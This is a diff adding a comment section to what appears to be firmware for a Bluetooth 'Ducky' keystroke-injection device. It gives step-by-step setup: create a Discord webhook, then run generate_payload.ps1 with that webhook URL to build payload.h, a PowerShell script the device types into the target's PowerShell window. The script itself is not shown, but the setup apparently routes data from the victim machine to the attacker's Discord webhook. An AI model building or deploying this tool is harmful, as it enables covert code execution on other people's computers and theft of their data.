+// ================================================================
+// SECTION J — How to Generate payload.h  (READ THIS!)
+// ================================================================
+//
+// The file "payload.h" contains the raw minified PowerShell script.
+// It is NOT included in this sketch by default — you must generate it.
+//
+// --- PREREQUISITES ---
+//
+//   1. Create a Discord webhook:
+//      - Open Discord → Server Settings → Integrations → Webhooks
+//      - Click "New Webhook", name it "BLE Ducky"
+//      - Copy the Webhook URL (looks like https://discord.com/api/webhooks/...)
+//
+// --- GENERATE payload.h (Windows PowerShell) ---
+//
+//   cd "C:\path\to\ble_ducky"
+//   PowerShell -File generate_payload.ps1 -Webhook "https://discord.com/api/webhooks/123456/ABCdef"
+//
+//   This creates payload.h with the script stored directly in PROGMEM
+//   (no Base64 encoding — the firmware types it character by character
+//   into an open PowerShell window).
+//
+// --- Verifying it worked ---
+//   When you compile, the serial output will show the payload length.
+//   A valid raw script is ~1500-2500 characters. If it says 0 or
+//   very small, something is wrong — check payload.h exists.
+//
+// ================================================================
+// END OF FILE
+// ================================================================
